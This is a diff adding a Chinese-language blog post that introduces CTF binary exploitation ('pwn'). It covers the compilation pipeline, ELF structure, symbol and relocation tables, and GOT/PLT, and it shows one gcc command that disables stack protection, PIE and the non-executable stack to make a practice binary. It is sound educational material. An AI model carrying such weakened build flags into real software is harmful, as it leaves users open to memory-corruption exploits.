@@ -1,0 +1,1678 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="keywords" content="Hexo Theme Keep">
+    <meta name="description" content="Hexo Theme Keep">
+    <meta name="author" content="Zach0ry">
+    
+    <title>
+        
+            pwn邮件入神 |
+        
+        Zach0ry&#39;s home
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+        <link rel="shortcut icon" href="/images/123.png">
+    
+    
+<link rel="stylesheet" href="/font/css/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/regular.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/solid.min.css">
+
+    
+<link rel="stylesheet" href="/font/css/brands.min.css">
+
+    
+    <script class="keep-theme-configurations">
+    const KEEP = window.KEEP || {}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Zach0ry's home","author":"Zach0ry","avatar":"/images/av.jpg","logo":"/images/123.png","favicon":"/images/123.png"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":false,"hide_header":true},"home":{"announcement":null,"category":false,"tag":false,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":false,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":false,"expand_all":false,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":false,"preload":false},"comment":{"enable":true,"use":"giscus","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":"zach0ry-zzh/zach0ry-zzh.github.io","repo_id":"R_kgDOPKvC2Q","category":"Comments","category_id":"DIC_kwDOPKvC2c4DByYU","reactions_enabled":true},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
+    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
+    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
+    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
+  </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+</div>
+
+
+
+<main class="page-container border-box">
+    <!-- home first screen  -->
+    
+
+    <!-- page content -->
+    <div class="page-main-content border-box">
+        <div class="page-main-content-top">
+            
+<header class="header-wrapper">
+
+    <div class="border-box header-content">
+        <div class="left flex-start border-box">
+            
+                <a class="logo-image border-box" href="/">
+                    <img src="/images/123.png">
+                </a>
+            
+            <a class="site-name border-box" href="/">
+               Zach0ry&#39;s home
+            </a>
+        </div>
+
+        <div class="right border-box">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
+                                
+                                HOME
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
+                                
+                                ARCHIVES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
+                                
+                                TAGS
+                                
+                            </a>
+                            
+                        </li>
+                    
+                        
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
+                                
+                                CATEGORIES
+                                
+                            </a>
+                            
+                        </li>
+                    
+                    
+                </ul>
+            </div>
+            <div class="mobile border-box flex-start">
+                
+                <div class="icon-item menu-bar">
+                    <div class="menu-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list border-box">
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+                
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="page-main-content-middle border-box">
+
+            <div class="main-content border-box">
+                
+
+                    
+<div class="fade-in-down-animation">
+    <div class="post-page-container border-box">
+        <div class="post-content-container border-box">
+            
+
+            <div class="post-content-bottom border-box">
+                
+                    <div class="post-title">
+                        pwn邮件入神
+                    </div>
+                
+
+                
+                    <div class="post-header border-box">
+                        
+                            <div class="avatar-box border-box">
+                                <img src="/images/av.jpg">
+                            </div>
+                        
+                        <div class="info-box">
+                            <div class="author border-box">
+                                <span class="name">Zach0ry</span>
+                                
+                                    <span class="author-badge">Lv4</span>
+                                
+                            </div>
+                            <div class="meta-info border-box">
+                                
+
+<div class="post-meta-info-container border-box post">
+    <div class="post-meta-info border-box">
+        
+
+        
+            <span class="meta-info-item post-create-date">
+                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
+                <span class="datetime">2025-03-20 14:53:58</span>
+            </span>
+
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Fri May 08 2026 19:53:00 GMT+0800">2026-05-08 19:53:00</span>
+                </span>
+            
+        
+
+        
+            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
+                <ul class="post-category-ul">
+                    
+                            <li class="category-item"><a href="/categories/pwn-study/">pwn_study</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+            <span class="post-tag meta-info-item border-box">
+                <ul class="post-tag-ul">
+                    
+                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/PWN/">PWN</a></li>
+                        
+                    
+                </ul>
+            </span>
+        
+
+        
+        
+        
+        
+    </div>
+
+    
+</div>
+
+                            </div>
+                        </div>
+                    </div>
+                
+
+                <div class="post-content keep-markdown-body ">
+                    
+
+                    
+                         <h2 id=""><a href="#" class="headerlink" title=""></a></h2><h1 id="PWN入门"><a href="#PWN入门" class="headerlink" title="PWN入门"></a>PWN入门</h1><p>CTF（Capture The Flag，夺旗赛）中的 “pwn”（发音类似 “pone”）是 <strong>“own”</strong> 这个词的一种黑客俚语写法，通常表示**“完全控制”、“取得支配权”<strong>或</strong>“击败”**</p>
+<p>起源于早期的网络游尤其是《魔兽争霸》，当时人们打字太快或拼写错误，将 “own” 打成了 “pwn”。这个错误很快被黑客和游戏社区接受，并演变成一个表示“彻底击败”或“占有”的流行词</p>
+<p>当你在CTF赛事中“pwn”了一个程序或服务，意思就是你<strong>成功利用了它的漏洞</strong>（例如缓冲区溢出、格式化字符串漏洞等），<strong>取得了对该程序的完全控制权</strong>，通常是获得了远程Shell或执行了任意代码，最终目的是读取服务器上的“flag”（旗帜）</p>
+<blockquote>
+<p><strong>终端（Terminal）</strong>：一种用于与计算机交互的输入输出界面，负责接收用户输入并显示程序输出。</p>
+<p><strong>Shell</strong>：一种命令行解释器，用于解析用户输入的命令并与操作系统内核交互执行。“拿到 shell”通常就是拿到与远端主机的<strong>命令行交互权限</strong>，相当于在那台机器上打开了一个终端（可以输入命令、看输出、读写文件）</p>
+</blockquote>
+<p><strong>考察方向</strong></p>
+<p>1）逆向程序的能力。</p>
+<p> 2）挖掘漏洞的能力。（深度）</p>
+<p> 3）编写利用链的能力</p>
+<h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><blockquote>
+<p>gcc main.c</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    puts(&quot;hello world&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="ghost-源码到可执行文件"><a href="#ghost-源码到可执行文件" class="headerlink" title=":ghost:源码到可执行文件"></a>:ghost:源码到可执行文件</h3><p>预处理 → 编译 → 汇编 → 链接 → 运行时加载&#x2F;重定位</p>
+<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251125214835444.png"  alt="image-20251125214835444"></p>
+<p><img   src="/fa1a60e0d67e4b02af1d0a6123a275d0.jpeg"  alt="img"></p>
+<p>开发链路分为：<code>source.c</code> →（预处理）→ <code>.i</code> →（编译）→ <code>.s</code> →（汇编）→ <code>.o</code>（ET_REL）→（链接）→ <code>app</code>（ET_EXEC 或 ET_DYN）→（运行时）→ 动态链接器把 <code>.so</code> 映射并做重定位。</p>
+<p><strong>1) 源码 — <code>main.c</code></strong></p>
+<p><strong>是什么</strong>：人类可读的 C 代码；包含函数、变量、控制流、头文件等。<br> <strong>包含</strong>：<code>#include</code>、<code>#define</code>、函数&#x2F;结构体&#x2F;注释、字符串常量。</p>
+<p><strong>2) 预处理输出 — <code>main.i</code> (预处理器结果)</strong></p>
+<p><strong>是什么</strong>：预处理器将 <code>#include</code> 展开并替换宏，生成纯 C 文本（含 <code># line</code> 指示）。<br> <strong>包含</strong>：展开的头文件内容、宏展开结果、行号指令<br> <strong>生成</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -E main.c -o main.i</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/image-20251030183329626.png"  alt="image-20251030183329626"></p>
+<p><strong>3)汇编源 — <code>main.s</code> （编译→生成汇编文本）</strong></p>
+<p><strong>是什么</strong>：编译器把 C 转成可读汇编指令的文本输出。<br> <strong>如何生成</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -S -O0 -g main.c -o main.s</span><br><span class="line">gcc -S -O0 -g foo.c -o foo.s</span><br></pre></td></tr></table></figure>
+
+<p>（<code>-O0 -g</code> 保持结构清晰且带调试信息；<code>-S</code> 生成 .s）</p>
+<p><img   src="/image-20251030203228220.png"  alt="image-20251030203228220"></p>
+<p><strong>包含 &#x2F; 注意点</strong>：</p>
+<ul>
+<li>函数的汇编实现（<code>push rbp; mov rbp, rsp</code> 等）</li>
+<li>参数&#x2F;局部变量如何分配（栈 vs 寄存器）</li>
+<li>编译器生成的 helper calls（<code>memcpy</code>、<code>__stack_chk_fail</code> 等）</li>
+</ul>
+<p><strong>4) 目标文件 — <code>source.o</code> （汇编 -&gt;机器码，ELF 可重定位，ET_REL）</strong></p>
+<p><strong>是什么</strong>：汇编后的机器码和节信息</p>
+<p>机器码是 CPU 能直接执行的<strong>二进制指令序列</strong></p>
+<ul>
+<li>把每条汇编指令编码成机器码字节</li>
+<li>划分节（Sections）：<ul>
+<li><code>.text</code> 代码</li>
+<li><code>.rodata</code> 只读常量</li>
+<li><code>.data</code> 已初始化全局&#x2F;静态变量</li>
+<li><code>.bss</code> 未初始化全局&#x2F;静态变量（只记大小）</li>
+</ul>
+</li>
+<li>生成<strong>符号表</strong>（Symbol Table）</li>
+<li>生成<strong>重定位表</strong>（Relocation Entries）<ul>
+<li>记录“哪些地址暂时未知，将来链接时修补”</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p><strong>符号表</strong>：<br>负责“名字级别的信息”——谁被定义、谁被引用、定义在哪个节的什么偏移。</p>
+<p><strong>重定位表</strong>：<br>负责“字节级别的补丁”——机器码&#x2F;数据里哪几个具体字节要用某个符号的最终地址去替换。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">extern void foo();</span><br><span class="line"></span><br><span class="line">int g = 123;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">    foo();</span><br><span class="line">    return g;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译到 <code>.o</code> 后，符号表大概会长这样（概念化）：</p>
+<table>
+<thead>
+<tr>
+<th>符号名</th>
+<th>状态</th>
+<th>节</th>
+<th>偏移</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>main</td>
+<td>已定义</td>
+<td>.text</td>
+<td>0x0</td>
+</tr>
+<tr>
+<td>g</td>
+<td>已定义</td>
+<td>.data</td>
+<td>0x0</td>
+</tr>
+<tr>
+<td>foo</td>
+<td>未定义(UND)</td>
+<td>无</td>
+<td>无</td>
+</tr>
+</tbody></table>
+<p>解释：</p>
+<ul>
+<li><code>main</code>、<code>g</code> 在本文件“有定义”，所以知道它们在本 .o 的哪个节、节内偏移多少。</li>
+<li><code>foo</code> 在本文件只是 <code>extern</code> 声明，没有定义，所以标记为 <strong>UND</strong>。<br> 意思是：<strong>“我需要 foo，但我这里没有，你链接时给我找一个。”</strong></li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>需要修的地方</th>
+<th>在哪个节</th>
+<th>偏移</th>
+<th>关联符号</th>
+<th>重定位类型</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>call puts</code> 的地址字段</td>
+<td><code>.text</code></td>
+<td>0x15</td>
+<td><code>puts</code></td>
+<td>R_X86_64_PC32</td>
+</tr>
+<tr>
+<td><code>mov eax, g</code> 的地址字段</td>
+<td><code>.text</code></td>
+<td>0x30</td>
+<td><code>g</code></td>
+<td>R_X86_64_32</td>
+</tr>
+</tbody></table>
+<p>关键点：</p>
+<ul>
+<li><strong>“需要修的地方”是一个具体字节位置</strong>（比如 <code>.text+0x15</code>）</li>
+<li><strong>“关联符号”告诉链接器该用谁的地址来修</strong></li>
+</ul>
+<p>只包含了的自定义的内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c main.c -o main.o</span><br></pre></td></tr></table></figure>
+
+<p><img   src="/image-20251030204109438.png"  alt="image-20251030204109438"></p>
+<p><strong>包含 &#x2F; 注意点</strong>：</p>
+<ul>
+<li><code>.text</code>, <code>.data</code>, <code>.rodata</code>, <code>.bss</code> 节</li>
+<li><strong>符号表</strong>：定义了该文件出口的函数&#x2F;变量（GLOBAL）以及未定义的引用（UNDEF）</li>
+<li><strong>重定位表</strong>：表示此文件有哪些地址需要链接器在链接时修正（例如对 <code>printf</code> 的引用）</li>
+</ul>
+<p><strong>pwn &#x2F; 调试的“钥匙”</strong>：</p>
+<ul>
+<li><p>看哪些符号是未定义（意味着链接时会从库或其它 .o 获取）</p>
+</li>
+<li><p>如果你想做更底层的二次打包或修改（比如注入符号、改变节），.o 是合适的阶段</p>
+</li>
+<li><p>重定位条目说明链接器需要做哪些修正（理解 PLT&#x2F;GOT 的由来）</p>
+</li>
+</ul>
+<p><strong>5) 可执行文件 — <code>app</code> （ET_EXEC 或 ET_DYN）</strong></p>
+<p><strong>是什么</strong>：链接器把 .o 和库合并，分配最终虚拟地址，产出可执行 ELF。若启用 PIE，则类型为 ET_DYN。<br> <strong>如何生成</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc main.o foo.o -o app</span><br><span class="line"># 或（显式 PIE/非-PIE）</span><br><span class="line">gcc -fPIE -pie main.o foo.o -o app_pie</span><br><span class="line">gcc -no-pie main.o foo.o -o app_nopie</span><br></pre></td></tr></table></figure>
+
+<p><strong>查看命令（必查）</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">file app</span><br><span class="line">readelf -h app           # ELF Type (EXEC / DYN)</span><br><span class="line">readelf -l app           # Program headers (PT_LOAD — how OS will map segments)</span><br><span class="line">readelf -S app           # Section headers (.text, .got, .plt ...)</span><br><span class="line">readelf -d app           # Dynamic tags: DT_NEEDED, DT_SONAME, DT_JMPREL, DT_PLTGOT...</span><br><span class="line">readelf -s app           # Symbols</span><br><span class="line">readelf -r app           # Relocations</span><br><span class="line">objdump -d app           # 反汇编</span><br><span class="line">objdump -R app           # 运行时重定位 (GOT/PLT entries)</span><br><span class="line">strings app | grep -E &#x27;sh|flag|system|printf&#x27;</span><br><span class="line">checksec --file=app      # NX, PIE, Canary, RELRO (若有 checksec)</span><br></pre></td></tr></table></figure>
+
+
+
+<blockquote>
+<p>程序调用 <code>puts()</code> 这样的函数时，函数实现其实在 libc 里，而不是你自己的 ELF 文件中。<br><strong>编译阶段</strong>你只知道“我需要 puts 这个符号”，<strong>运行阶段</strong>才能确定“puts 真正在哪个地址”。</p>
+<p>got表是libc库中该函数的真实位置</p>
+<p>plt表是放置的一段代码，通过调用got表知道 跳转到哪里</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th>角色</th>
+<th>存放位置</th>
+<th>作用</th>
+<th>是否可写</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>PLT</strong></td>
+<td><code>.text</code> 段</td>
+<td>函数跳板（代码），调用 GOT</td>
+<td>不可写</td>
+</tr>
+<tr>
+<td><strong>GOT</strong></td>
+<td><code>.got/.got.plt</code> 段</td>
+<td>保存外部函数实际地址</td>
+<td>可写（部分只读）</td>
+</tr>
+</tbody></table>
+<p><img   src="/image-20251030152851093.png"  alt="image-20251030152851093"></p>
+<p>最左侧是高层语言的表示，语义是“把两个整数相加返回”。编译器需要把这种高层语义翻译成一系列 CPU 指令来实现同样的功能（编译）</p>
+<p>中间就是进行的实际操作，通过对一系列寄存器的操作来实现代码</p>
+<p>最右侧是机器码，也就是机器实际可以识别的内容，每条汇编指令都有对应的机器码字节。</p>
+<blockquote>
+<p>ida查看</p>
+<p>Options&gt;General&gt;调节之后就可以看到机器码</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 普通编译（带调试符号，关闭优化）</span><br><span class="line">gcc -g -O0 -o 1 gcc.c</span><br></pre></td></tr></table></figure>
+
+<p><code>-g</code><br> 包含调试符号（符号表、源代码行号等）到输出文件。<br> → 作用：可以在 <code>gdb</code> 里看到函数名、变量名和源代码行，便于调试</p>
+<p><code>-o &lt;file&gt;</code><br> 指定输出文件名（默认 <code>a.out</code>）。<br> → 作用：把编译&#x2F;链接结果写到你想要的路径。</p>
+<p><code>-O0</code>, <code>-O2</code>（<code>-O*</code> 系列）<br> 控制优化等级：<code>-O0</code> 无优化（编译速度快、符号保留好），<code>-O2</code> 开启较多优化（更快但会重排&#x2F;内联&#x2F;消除栈帧）。<br> → 作用：它是编译器的优化级别，目的是让程序跑得更快、更小、用更少资源</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">控制保护</span><br><span class="line"># 生成不带栈保护、不启用 PIE、不启用 RELRO 的“脆弱”二进制（用于练习）</span><br><span class="line">gcc -g -O0 -fno-stack-protector -no-pie -z execstack -o 2 gcc.c</span><br><span class="line"></span><br><span class="line"># 启用 PIE 和全 RELRO（更安全的编译）</span><br><span class="line">gcc -g -O2 -fPIE -pie -Wl,-z,relro,-z,now -o 3 gcc.c</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>cat 1</p>
+<p><code>cat 1</code> 把一个 <strong>可执行文件（ELF 二进制）</strong> 的原始字节直接吐到终端里 —— 终端不是文本编辑器，而是会把那些“原始字节”当作控制字符去解释（换行、响铃、光标移动、甚至改变显示属性），所以你看到一堆乱码、控制符拼凑的怪样子。简单来说：</p>
+<ul>
+<li>可执行文件不是纯文本，里面有二进制机器码、ELF 头、节&#x2F;段表、符号表、字符串常量、调试信息等 —— 都不是人类可读的纯文字。</li>
+<li><code>cat</code> 只是把字节原封不动输出到终端，终端把不可见字节当控制序列执行，结果就是“乱码 + 显示混乱”。</li>
+</ul>
+</blockquote>
+<h3 id="elf可执行文件"><a href="#elf可执行文件" class="headerlink" title="elf可执行文件"></a>elf可执行文件</h3><p>该板块参考了<a class="link"   target="_blank" rel="noopener" href="https://chuquan.me/2018/05/21/elf-introduce/" >楚权的世界<i class="fas fa-external-link-alt"></i></a>师傅的文章</p>
+<p>可执行文件就是一段被组织成特定格式的二进制数据，操作系统加载它到内存后由 CPU 执行。</p>
+<p>不同 OS&#x2F;架构用不同格式：Windows 用 PE，macOS 用 Mach-O，Linux&#x2F;Unix 主流用 <strong>ELF</strong>。</p>
+<p><img   src="/pwn%E5%85%A5%E9%97%A8/image-20251016145707472.png"  alt="image-20251016145707472"></p>
+<h4 id="ELF-Header"><a href="#ELF-Header" class="headerlink" title="ELF Header"></a>ELF Header</h4><p>位置：文件开头（固定大小）。</p>
+<p>作用：基本元信息 —— ELF 魔数（0x7f’ELF）、类（32&#x2F;64）、字节序、ELF 类型（ET_REL&#x2F;ET_EXEC&#x2F;ET_DYN）、机器架构、入口点地址 <code>e_entry</code>、程序头偏移 <code>e_phoff</code>、节头偏移 <code>e_shoff</code>。</p>
+<p><code>Type</code> 决定这是 <code>.o</code>（ET_REL）、可执行（ET_EXEC）还是共享对象&#x2F;PIE（ET_DYN）；<code>e_entry</code> 是程序入口（运行时从这里开始）。</p>
+<blockquote>
+<p>readelf -h 2</p>
+</blockquote>
+<p>.&#x2F;extract debs&#x2F;libc6_2.23-0ubuntu11_amd64.deb libs&#x2F;2.23-0ubuntu11_amd64<br>.&#x2F;extract debs&#x2F;libc6-dbg_2.23-0ubuntu11_amd64.deb libs&#x2F;2.23-0ubuntu11_amd64&#x2F;.debug</p>
+<h4 id="Program-Header-Table（程序头表，Segments）"><a href="#Program-Header-Table（程序头表，Segments）" class="headerlink" title="Program Header Table（程序头表，Segments）"></a>Program Header Table（程序头表，Segments）</h4><p>ELF 节头表是一个节头数组。每一个节头都描述了其所对应的节的信息，如节名、节大小、在文件中的偏移、读写权限等。<strong>编译器、链接器、装载器都是通过节头表来定位和访问各个节的属性的。</strong></p>
+<blockquote>
+<h3 id="readelf-l-2"><a href="#readelf-l-2" class="headerlink" title="readelf -l 2"></a>readelf -l 2</h3></blockquote>
+<p>PT_LOAD：可加载段（会映射到内存，带权限 PF_R&#x2F;W&#x2F;X）</p>
+<p>PT_INTERP：指定动态链接器路径（有的话就是动态可执行）</p>
+<p>PT_DYNAMIC：动态段信息（DT_NEEDED、DT_RPATH、DT_RELA 等）</p>
+<p>PT_NOTE、PT_PHDR、PT_GNU_STACK（表示栈是否可执行）等</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="Sections（节-Sections）"><a href="#Sections（节-Sections）" class="headerlink" title="Sections（节 &#x2F; Sections）"></a>Sections（节 &#x2F; Sections）</h4><p>常见节名：</p>
+<ul>
+<li><code>.text</code>：代码（只读&#x2F;可执行）</li>
+<li><code>.rodata</code>：只读数据（字符串常量）</li>
+<li><code>.data</code>：已初始化的可写数据</li>
+<li><code>.bss</code>：未初始化数据（不占文件空间，运行时占内存）</li>
+<li><code>.symtab</code> &#x2F; <code>.strtab</code>：符号表与字符串表（链接时用）</li>
+<li><code>.dynsym</code> &#x2F; <code>.dynstr</code>：动态符号表（动态链接时用）</li>
+<li><code>.got</code> &#x2F; <code>.got.plt</code>：全局偏移表（数据，运行时可写）</li>
+<li><code>.plt</code>：过程链接表（代码段，跳板）</li>
+<li><code>.rela/.rel</code>：重定位条目（relocations）</li>
+<li><code>.init_array</code> &#x2F; <code>.fini_array</code>：构造&#x2F;析构函数列表</li>
+</ul>
+<h4 id="text"><a href="#text" class="headerlink" title=".text"></a><code>.text</code></h4><ul>
+<li><strong>放什么</strong>：程序的机器码（函数指令）。</li>
+<li><strong>特点</strong>：只读（r–）+ 可执行（–x）。</li>
+<li><strong>例子</strong>：<code>main</code>, <code>foo</code> 这些函数编译出的指令都在这。</li>
+</ul>
+<hr>
+<h4 id="rodata"><a href="#rodata" class="headerlink" title=".rodata"></a><code>.rodata</code></h4><ul>
+<li><strong>放什么</strong>：只读常量数据。</li>
+<li><strong>特点</strong>：只读（r–），不可写。</li>
+<li><strong>例子</strong><ul>
+<li>字符串常量：<code>&quot;hello world&quot;</code></li>
+<li><code>const</code> 修饰且不需要可写的全局常量</li>
+<li>只读查找表、跳转表（有时也会在这里）</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h4 id="data"><a href="#data" class="headerlink" title=".data"></a><code>.data</code></h4><ul>
+<li><p><strong>放什么</strong>：<strong>已初始化</strong>的全局变量 &#x2F; 静态变量。</p>
+</li>
+<li><p><strong>特点</strong>：可读可写（rw-），文件里保存初值。</p>
+</li>
+<li><p><strong>例子</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int g = 5;</span><br><span class="line">static int s = 2;</span><br></pre></td></tr></table></figure>
+
+<p>初值 <code>5</code>、<code>2</code> 都会在 <code>.data</code> 里。</p>
+</li>
+</ul>
+<hr>
+<h4 id="bss"><a href="#bss" class="headerlink" title=".bss"></a><code>.bss</code></h4><ul>
+<li><p><strong>放什么</strong>：<strong>未初始化</strong>（或初始化为 0）的全局变量 &#x2F; 静态变量。</p>
+</li>
+<li><p><strong>特点</strong></p>
+<ul>
+<li>文件里<strong>不存具体内容</strong>，只记大小</li>
+<li>运行时会分配内存并清 0</li>
+</ul>
+</li>
+<li><p><strong>例子</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int g;</span><br><span class="line">static int s;</span><br><span class="line">int z = 0;  // 很多编译器也会放 bss</span><br></pre></td></tr></table></figure></li>
+</ul>
+<hr>
+<h4 id="symtab-strtab"><a href="#symtab-strtab" class="headerlink" title=".symtab &#x2F; .strtab"></a><code>.symtab</code> &#x2F; <code>.strtab</code></h4><ul>
+<li><strong>放什么</strong><ul>
+<li><code>.symtab</code>：<strong>静态符号表</strong><br> 记录本目标文件&#x2F;可执行文件里<strong>所有符号</strong>（函数、全局变量、段符号等）的信息。</li>
+<li><code>.strtab</code>：符号名字的字符串池（符号表里只存“指向这里的偏移”）。</li>
+</ul>
+</li>
+<li><strong>什么时候用</strong>：主要给<strong>链接器、调试器</strong>用。</li>
+<li><strong>发布版程序常见情况</strong>：<code>strip</code> 后 <code>.symtab/.strtab</code> 可能被删掉（因为运行时不需要）。</li>
+</ul>
+<hr>
+<h4 id="dynsym-dynstr"><a href="#dynsym-dynstr" class="headerlink" title=".dynsym &#x2F; .dynstr"></a><code>.dynsym</code> &#x2F; <code>.dynstr</code></h4><ul>
+<li><strong>放什么</strong><ul>
+<li><code>.dynsym</code>：<strong>动态符号表</strong><br> 只保存<strong>动态链接需要的那部分符号</strong>（比 <code>.symtab</code> 少很多）。</li>
+<li><code>.dynstr</code>：动态符号名字符串池。</li>
+</ul>
+</li>
+<li><strong>什么时候用</strong>：<strong>运行时动态链接器</strong>解析共享库符号时用。</li>
